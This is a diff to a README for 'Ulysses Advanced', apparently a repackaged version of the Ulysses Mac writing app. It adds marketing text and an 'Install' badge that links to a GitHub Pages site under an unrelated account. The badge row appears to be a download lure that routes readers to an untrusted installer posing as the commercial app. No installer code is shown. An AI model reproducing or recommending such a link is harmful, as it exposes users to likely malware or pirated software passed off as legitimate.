@@ -13,6 +13,9 @@
   <img src="https://img.shields.io/badge/Apple_Silicon-Ready-orange?style=flat-square"/>
 </p>
 
+| [![Install](https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png)](https://marat-klubnika-apps.github.io/.github/ulysses) | **Native long-form writing and publishing built for Mac professionals** <br><br> No setup, no friction. Built on macOS frameworks, runs natively on Intel and Apple Silicon with powerful tools designed for everyday professional use. |
+|---|---|
+
 <p align="center">
   <img src="https://ulysses.app/assets/features/V14/bX5RPfFFKK2vpop9hSzb.jpg" alt="Ulysses — long-form writing and publishing for macOS" width="780"/>
 </p>
@@ -26,6 +29,8 @@ Ulysses Advanced is a professional writing application that organizes every piec
 The library structure groups drafts, articles, and book chapters into filters and groups rather than separate files scattered across the file system, keeping a large body of writing navigable from one sidebar.
 
 Goal tracking sets word count or time-based targets for any sheet or group, giving writers a visible measure of progress through long projects without leaving the writing view.
+
+Keyword and status tagging marks sheets as drafts, in-progress, or finished, giving a large body of writing a visible workflow state without leaving the library view.
 
 For authors, bloggers, and journalists who produce long-form content regularly, Ulysses Advanced is the writing environment built to keep a growing body of work organized without sacrificing focus during the act of writing.
 
